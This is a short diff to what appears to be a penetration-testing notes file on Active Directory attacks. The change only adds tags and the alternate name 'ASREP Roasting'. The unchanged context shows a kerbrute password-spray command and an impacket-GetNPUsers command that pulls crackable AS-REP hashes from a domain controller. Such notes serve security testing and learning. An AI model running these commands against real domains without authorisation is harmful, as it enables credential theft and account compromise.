@@ -19,11 +19,11 @@ kerbrute passwordspray --dc $TARGET_IP -d $TARGET_AD users -t 100 -v --user-as-p
 
 AS-REP Roasting
 ---
-#as-rep-roasting #kerberos
+#as-rep-roasting #kerberos #asrep-roasting
 
 No password ticket query against a user list, not requiring Kerberos pre-authentication,
 AKA. 
-AS-REP Roasting
+AS-REP Roasting or ASREP Roasting
 
 ```shell
 impacket-GetNPUsers -no-pass -usersfile users -dc-ip $TARGET_IP $TARGET_DOMAIN/ -format hashcat
